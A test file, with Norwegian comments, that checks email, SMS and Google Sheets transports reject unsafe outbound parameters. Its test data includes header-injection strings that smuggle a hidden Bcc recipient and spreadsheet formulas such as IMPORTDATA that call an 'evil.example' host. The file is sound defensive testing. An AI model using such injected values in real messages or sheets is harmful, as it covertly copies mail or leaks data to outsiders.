import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { GmailTransport, GoogleSheetsTransport, MicrosoftOutlookTransport, TwilioTransport } from "../src/live-transports.ts";
import {
  UnsafeOutboundParameterError,
  assertE164,
  assertHeaderValue,
  assertNoDangerousSheetFormulas,
  assertSingleEmailAddress
} from "../src/url-safety.ts";

/** Del 3 (JARVIS-048/015): utgående parametre valideres deterministisk FØR leverandørkallet. */
function stubFetch() {
  const calls: Array<{ url: string; init: RequestInit | undefined }> = [];
  vi.stubGlobal("fetch", async (url: string, init?: RequestInit) => {
    calls.push({ url, init });
    if (url.includes("oauth2.googleapis.com/token")) return { ok: true, json: async () => ({ access_token: "tok" }) } as unknown as Response;
    return { ok: true, json: async () => ({ id: "x", updates: { updatedRange: "A1" } }) } as unknown as Response;
  });
  return calls;
}

beforeEach(() => {
  vi.stubEnv("JARVIS_GOOGLE_CLIENT_ID", "cid");
  vi.stubEnv("JARVIS_GOOGLE_CLIENT_SECRET", "csecret");
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
});

describe("validatorer", () => {
  it("assertHeaderValue avviser CR, LF, NUL, U+2028 og for lange/tomme verdier", () => {
    for (const bad of ["a\r\nBcc: x@y.no", "a\nb", "a\rb", "a\u0000b", "a b", "", "x".repeat(201)]) {
      expect(() => assertHeaderValue(bad, "subject", 200)).toThrow(UnsafeOutboundParameterError);
    }
    expect(assertHeaderValue("Hei på deg", "subject")).toBe("Hei på deg");
  });
  it("assertSingleEmailAddress krever nøyaktig én ren adresse", () => {
    expect(assertSingleEmailAddress("henrik@ffskis.com")).toBe("henrik@ffskis.com");
    for (const bad of ["a@b.no, c@d.no", "Navn <a@b.no>", "a@b.no\r\nBcc: c@d.no", "a@b", "@b.no", "a b@c.no", "a@b.no;c@d.no", "a@@b.no"]) {
      expect(() => assertSingleEmailAddress(bad)).toThrow(UnsafeOutboundParameterError);
    }
  });
  it("assertE164 krever + og 8-15 sifre", () => {
    expect(assertE164("+4799998888")).toBe("+4799998888");
    for (const bad of ["99998888", "+0123456789", "+47 999 98 888", "+47abc", "+1234567", `+${"1".repeat(16)}`]) {
      expect(() => assertE164(bad)).toThrow(UnsafeOutboundParameterError);
    }
  });
  it("assertNoDangerousSheetFormulas avviser eksfiltrerende formler, tillater vanlige tall/tekst/formler uten nettverk", () => {
    expect(() => assertNoDangerousSheetFormulas([['=IMPORTDATA("https://evil.example/x")']])).toThrow(UnsafeOutboundParameterError);
    expect(() => assertNoDangerousSheetFormulas(['=HYPERLINK("https://evil","klikk")'])).toThrow(UnsafeOutboundParameterError);
    expect(() => assertNoDangerousSheetFormulas(['+image("https://evil/p.png")'])).toThrow(UnsafeOutboundParameterError);
    expect(() => assertNoDangerousSheetFormulas([["hei", 12, true, "=SUM(A1:A3)"]])).not.toThrow();
  });
});

describe("Gmail send (class D) - header-injeksjon og mottakerbinding", () => {
  it("CR/LF i subject eller to avvises FØR noe sendes (ingen skjult Bcc)", async () => {
    const calls = stubFetch();
    const t = new GmailTransport("me@x.no");
    await expect(t.invoke("send", { to: "a@b.no", subject: "Hei\r\nBcc: spy@evil.no", body: "x" }, "rt")).rejects.toThrow(/subject_control_characters/);
    await expect(t.invoke("send", { to: "a@b.no\r\nBcc: spy@evil.no", subject: "Hei", body: "x" }, "rt")).rejects.toThrow(/to_/);
    await expect(t.invoke("send", { to: "a@b.no, spy@evil.no", subject: "Hei", body: "x" }, "rt")).rejects.toThrow(/to_not_a_single_address/);
    expect(calls.some((c) => c.url.includes("messages/send"))).toBe(false);
  });
  it("gyldig sending bygger en rå melding uten ekstra headere", async () => {
    const calls = stubFetch();
    await new GmailTransport("me@x.no").invoke("send", { to: "henrik@ffskis.com", subject: "Møte i morgen", body: "Hei" }, "rt");
    const send = calls.find((c) => c.url.includes("messages/send"))!;
    const raw = Buffer.from(JSON.parse(String(send.init!.body)).raw, "base64url").toString("utf8");
    const headers = raw.split("\r\n\r\n")[0]!.split("\r\n");
    expect(headers.filter((h) => /^(bcc|cc|reply-to|from):/i.test(h))).toEqual([]);
    expect(headers[0]).toBe("To: henrik@ffskis.com");
  });
  it("Outlook send_mail validerer også mottakeren", async () => {
    stubFetch();
    vi.stubEnv("JARVIS_OUTLOOK_TOKEN", "t");
    await expect(new MicrosoftOutlookTransport().invoke("send_mail", { to: "a@b.no, c@d.no", subject: "s", body: "b" }, "tok")).rejects.toThrow(/to_not_a_single_address/);
  });
});

describe("SMS: mottaker må være E.164", () => {
  it("Twilio avviser et ikke-nummer FØR kallet", async () => {
    const calls = stubFetch();
    const t = new TwilioTransport(async () => "ACxxx", async () => "+4711111111");
    await expect(t.invoke("notify", { to: "ikke-et-nummer", message: "hei" }, "auth")).rejects.toThrow(/to_not_e164/);
    expect(calls).toHaveLength(0);
  });
});

describe("Sheets: RAW er standard", () => {
  it("update_range og append_row bruker valueInputOption=RAW uten eksplisitt valg", async () => {
    const calls = stubFetch();
    const t = new GoogleSheetsTransport();
    await t.invoke("update_range", { spreadsheet_id: "s1", range: "A1", values: [["=1+1"]] }, "rt");
    await t.invoke("append_row", { spreadsheet_id: "s1", range: "A1", row: ["=1+1"] }, "rt");
    const sheets = calls.filter((c) => c.url.includes("sheets.googleapis.com"));
    expect(sheets).toHaveLength(2);
    for (const c of sheets) expect(c.url).toContain("valueInputOption=RAW");
    expect(sheets.some((c) => c.url.includes("USER_ENTERED"))).toBe(false);
  });
  it("USER_ENTERED krever eksplisitt valg og avviser eksfiltrerende formler", async () => {
    const calls = stubFetch();
    const t = new GoogleSheetsTransport();
    await t.invoke("update_range", { spreadsheet_id: "s1", range: "A1", values: [["=SUM(1,2)"]], value_input_option: "USER_ENTERED" }, "rt");
    expect(calls.find((c) => c.url.includes("sheets.googleapis.com"))!.url).toContain("valueInputOption=USER_ENTERED");
    await expect(
      t.invoke("append_row", { spreadsheet_id: "s1", range: "A1", row: ['=IMPORTDATA("https://evil.example")'], value_input_option: "USER_ENTERED" }, "rt")
    ).rejects.toThrow(/sheet_formula_not_allowed/);
    await expect(t.invoke("append_row", { spreadsheet_id: "s1", range: "A1", row: ["x"], value_input_option: "FORMULAS" }, "rt")).rejects.toThrow(/value_input_option_invalid/);
  });
});
